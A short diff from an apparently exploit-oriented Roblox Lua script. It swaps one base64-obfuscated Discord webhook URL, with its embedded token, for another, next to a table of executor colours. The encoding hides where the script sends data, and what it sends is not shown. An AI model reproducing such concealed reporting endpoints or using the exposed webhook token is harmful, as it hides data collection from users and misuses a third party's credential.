@@ -287,7 +287,7 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
 -- Base64 decoded webhook URL
-local WebhookURL = base64Decode("aHR0cHM6Ly9kaXNjb3JrYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM4NDcxNjg5MTY0MTIxNzIwNC91MEFKZFdhbXhrVFQway1rYlFubjRCV3NmaE53RUs1VTUyRkFwY1AwRjJ0cW1WRE9LanAwMmxOeko3bmYxYTJmemxjXw==")
+local WebhookURL = base64Decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQyMDcyMzgwNDY0ODI0NzQwOC9qbkEzYnA5Nk00UFJpbEJIUmZUdGV2Z2FSSlFtakpDS2Ruem1jUWhEWjVlb05WRW9uUEJhVUwtbU80ektaRTJ1YW1kQg==")
 
 local EXECUTOR_COLORS = {
     ["Synapse X"] = 0x8A2BE2,
